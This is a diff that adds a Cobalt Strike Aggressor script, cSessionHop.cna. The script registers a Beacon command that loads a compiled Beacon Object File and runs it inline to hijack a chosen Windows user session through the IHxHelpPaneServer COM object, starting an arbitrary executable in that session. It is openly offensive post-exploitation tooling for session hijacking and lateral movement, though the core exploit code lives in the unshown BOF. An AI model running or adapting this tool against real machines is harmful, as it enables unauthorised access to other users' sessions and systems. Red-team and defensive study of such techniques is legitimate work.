@@ -1,0 +1,75 @@
+# cSessionHop.cna
+# Author: Jacek Halon (@jack_halon)
+
+# Credits To: James Forshaw, Michael Zhmailo (CICADA8), 3lp4tr0n
+# https://projectzero.google/2016/01/raising-dead.htmlJames Forshaw
+# https://cicada-8.medium.com/process-injection-is-dead-long-live-ihxhelppaneserver-af8f20431b5d
+# https://github.com/3lp4tr0n/SessionHop
+
+# Register help/usage for cSessionHop
+beacon_command_register(
+"cSessionHop",
+"cSessionHop: Tool that utilizes the IHxHelpPaneServer COM object, configured to run as an Interactive User, to hijack specified user sessions.",
+"\ncSessionHop: Session hijacking technique that utilizes the IHxHelpPaneServer COM object, which is configured to run as an Interactive User, and can be utilzied to hijack specified user sessions.
+Usage: cSessionHop [SESSIONID] [FILEPATH]
+SESSIONID: Target session ID (use Explorer => Process List for sessions)
+FILEPATH: Path to executable on target system (e.g., notepad.exe, C:\\Windows\\System32\\cmd.exe)"
+);
+
+# Setup cSessionHop
+alias cSessionHop {
+
+    # Alias for Beacon ID and args
+    local('$bid $barch $handle $data $sessionId $filePath $args');
+
+    # Get Beacon ID from first argument
+    $bid = $1;
+
+    # Determine the amount of arguments
+    if(size(@_) < 3)
+    {
+        berror($bid, "Error! Please enter a valid SessionId and File Path");
+        berror($bid, "For more information please see 'help cSessionHop'");
+        return;
+    }
+
+    # Arguments (Session ID, File Path)
+    $sessionId = $2;
+    $filePath = $3;
+
+    # Verify sessionId argument is a number
+    if (!-isnumber $sessionId)
+    {
+        berror($bid, "$sessionId is not a valid SessionId");
+        return;
+    }
+
+    # Get the architecture of the Beacon
+    $barch = barch($bid);
+
+    # Read in the BOF
+    $handle = openf(script_resource("cSessionHop. $+ $barch $+ .o"));
+    
+    if ($handle is $null)
+    {
+        berror($bid, "Could not open BOF file: cSessionHop. $+ $barch $+ .o");
+        return;
+    }
+    
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0)
+    {
+        berror($bid, "BOF file is empty or could not be read");
+        return;
+    }
+
+    # Pack the arguments (int for sessionId, wstring for filePath)
+    $args = bof_pack($bid, "iZ", $sessionId, $filePath);
+
+    # Run the BOF
+    # go = Entry point of the BOF
+    btask($bid, "Running cSessionHop with SessionId: $sessionId and FilePath: $filePath");
+    beacon_inline_execute($bid, $data, "go", $args);
+}
